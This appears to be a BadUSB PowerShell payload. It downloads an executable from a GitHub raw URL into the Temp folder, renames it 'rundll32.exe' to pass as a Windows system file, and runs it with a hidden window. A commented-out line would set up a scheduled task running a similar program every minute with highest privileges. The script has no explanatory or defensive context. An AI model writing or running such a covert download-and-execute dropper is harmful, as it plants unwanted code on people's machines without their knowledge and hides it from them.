cd $env:Temp;
iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/cAps-TroLl-v3.exe -O rundll32.exe -UseBasicParsing;
Start-Sleep 1;
Start-Process .\rundll32.exe -WindowStyle Hidden;
# schtasks /create /tn "CapsLockTask" /tr "C:\Users\Administrator\Documents\cAps-TroLl-v2\capslock.exe" /sc minute /mo 1 /rl highest /f /ru "$env:USERNAME";
exit
